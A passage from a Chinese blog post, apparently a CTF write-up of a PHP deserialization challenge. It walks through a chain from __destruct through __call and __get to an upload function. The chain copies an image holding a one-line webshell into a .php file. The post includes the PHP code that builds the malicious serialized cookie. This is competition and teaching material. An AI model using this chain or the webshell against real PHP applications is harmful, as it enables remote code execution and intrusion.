@chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这种题目，首先需要找的，就是用户能够输入的变量或者说，我们能够改变的变量，我们可以看到，在index.php中，有可以利用的地方。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-f27c4ee06eed946b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>在login_check这个函数中，我们可以看到，cookie中的user是被序列化后又base64编码的。而我们在另外两个php文件中，可以看到一些php的关于反序列化的魔法函数，这就更加加深了我对此题目是反序列化题目的猜测，现在我们来看如何构造poc链。</p>
+<p>由于题目网址，对上传文件的类型做了一个限制，只能传图片，所以刚开始没有什么思路。但是在看profile的时候，有了思路。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-0059cee8e7179d38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>我们可以看到，在这个函数中，后台显示把上传的文件，保存到临时文件filename_tmp里面，然后又把这个临时文件拷贝到filename的文件中，再把临时文件删除。这个并不是关键，关键是，可控，可控，可控。</p>
+<p>filename_tmp和filename是我们可以控中的，为什么可以控制？如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-1ae8d7fab762f127.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>我们完全可以反序列化的时候，把我们想要的filename_tmp内容，给复制到filename里面。下面我们看如何构造</p>
+<p>首先我们明确的是，必须要用到profile里面的upload_img函数，但是函数里面首先是两个if语句。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-c8ce72bfa0dbce23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>第一个很好绕过，checker变量我们可控，直接在反序列化的时候，设置为0即可。而第二个if语句，是控制上传文件类型的。我们不需要上传文件，所以$_FILES为空的，直接可以绕过。而filename_tmp我们可以上传一个图片马，而filename我们命名为cxc.php。这样我们就可以把图片马的内容放到cxc.php里面，然后我们就可以运行cxc.php来getshell</p>
+<p>那么问题来了，如何才能调用upload_img函数呢，我们在profile.php中看到了_call函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-abed9a6416c5b6b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>关于这个函数的描述，如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-fd188640843a41e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>而在register.php中，有一个比较怪的函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-34889398957ceb14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>这里我们由于在regeister.php中checker也是我们可控的，所以如果我们把checker赋值成profile的一个对象，那么当他调用index()函数(profile类中没有这个函数)那么就会出发profile.php中的_call函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-b529ed3117d4e11d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>而在_call函数里面，会调用this-&gt;{\$name},而这边由于是在register.php中的this-&gt;checker-&gt;index()触发的，所以this-&gt;{\$name}=this-&gt;index，而index这个属性，在profile.php中并没有声明，所以，会触发_get函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-de85aa1b8fe18bf1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>在_get函数中，我们可以看到ecept变量，而这个变量我们可以操控，我们就可以用\$test-&gt;except = array(‘index’=&gt;’upload_img’); 来使得_get函数返回upload_img，最终在\$this-&gt;{\$this-&gt;{\$name}}(​\$arguments);成功调用upload_img函数。</p>
+<h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><p>首先构造图片马进行上传，这个步骤很简单，写一个一句话木马，随便找个png图片，直接把木马copy到里面就行了。然后进行上传，可以上传成功，查看源码，可以查看路径。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-68ec2e005fb32475.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>我们可以进入这个网址，可以看到这个文件夹里面所有的文件</p>
+<p>最终的payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> Profile();  </span><br><span class="line">$test-&gt;checker = <span class="number">0</span>;  </span><br><span class="line">$test-&gt;except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);  </span><br><span class="line">$test-&gt;ext = <span class="string">'php'</span>;  </span><br><span class="line">$test-&gt;filename_tmp = <span class="string">'./upload/08856017fa6b6b422db719c5519123dc/1fb5eb9bf1b45aa7c3cf62de3672fbaf.png'</span>;  </span><br><span class="line">$test-&gt;filename = <span class="string">'./upload/08856017fa6b6b422db719c5519123dc/cxc.php'</span>;  </span><br><span class="line">  </span><br><span class="line">$a=<span class="keyword">new</span> Register();  </span><br><span class="line">$a-&gt;checker = $test;  </span><br><span class="line">$a-&gt;registed =<span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">$exp = base64_encode(serialize($a));  </span><br><span class="line">var_dump($exp);</span><br></pre></td></tr></table></figure>
+<p>其中\$test-&gt;filename_tmp是我们上传的图片马，\$test-&gt;filename是我们新的文件名，我们构造一个profile类的实例，把上面的一些操作高尚，然后再构造一个register的实例，将checker赋值为我们创造的profile类，registed赋值为0，是为了进入__destruct函数的if语句</p>
+<p>然后我们将序列化的东西进行base64编码，输出出来</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-a9d8305ca1b1f1e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>然后把这一段话，传入cookie中。然后可以在文件夹中看到我写的shell</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-ba38da01da4e6624.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>然后访问，post，得到flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-58a6cd5ffcede780.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次的这个题，是对之前的反序列化知识的一个很好的总结，加深了对构造poc链的理解，怎么说呢，还是对魔术函数和代码不够敏感啊！</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Bling_Dog</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/05/27/QWB反序列化/">http://yoursite.com/2019/05/27/QWB反序列化/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/05/27/QWB反序列化/">May 27th 2019, 9:53:22 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/05/27/QWB反序列化/">May 27th 2019, 11:39:08 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/05/21/rctf web/" title="Rctf web复现">
+                    <div class="prevTitle">Rctf web复现</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:563667866@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#index-php"><span class="toc-number">1.</span> <span class="toc-text">index.php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Register-php"><span class="toc-number">2.</span> <span class="toc-text">Register.php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Profile-php"><span class="toc-number">3.</span> <span class="toc-text">Profile.php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">3.0.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实际操作"><span class="toc-number">4.</span> <span class="toc-text">实际操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 24
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/QWB反序列化/">国赛一道反序列化的思考</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/2019/05/21/rctf web/">Rctf web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href="/2019/05/19/padding oracle/">padding oracle学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/DataConDns1/">360Datacon大数据安全比赛DNS方向一WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2019/04/27/2019国赛部分题目WP---NEX的小老妹/">2019国赛部分题目wp-by NEX</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/2019DDctfWP/">2019DDctfWP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/安恒杯西湖论剑/">安恒杯西湖论剑wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href="/2019/02/12/hgame2019/">hgame-2019 wp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/安恒杯12月份部分wp/">安恒杯12月份部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/2018/11/28/安恒杯11月份web/">安恒杯11月份web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2018/11/21/CBC字节反转攻击问题/">CBC反转攻击问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href="/2018/11/18/湖湘杯/">湖湘杯部分题目wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href="/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/">2018高校网络信息安全管理运维挑战赛wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/2018-hctf/">2018-hctf-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2018/11/07/uploads/">uploads-labs总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/php伪协议/">php伪协议的一些总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/2018/11/04/2018上海市大学生部分wp/">2018上海市大学生部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href="/2018/11/03/ichunqiuweb/">ichunqiu web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/nctf/">南邮ctf平台</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href="/2018/10/27/安恒11月/">安恒杯11月份密码学部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href="/2018/10/26/jarvisoj/">jarvisoj web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2018/10/24/phpxuliehua/">PHP反序列化的一些例子</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href="/2018/10/18/bugku/">bugCTF-web方向wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href="/2018/10/16/ustc/">2018ustcCTF部分题目wp</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="Analysis"><span class="iconfont-archer">&#xe606;</span>Analysis</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Bling_Dog"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
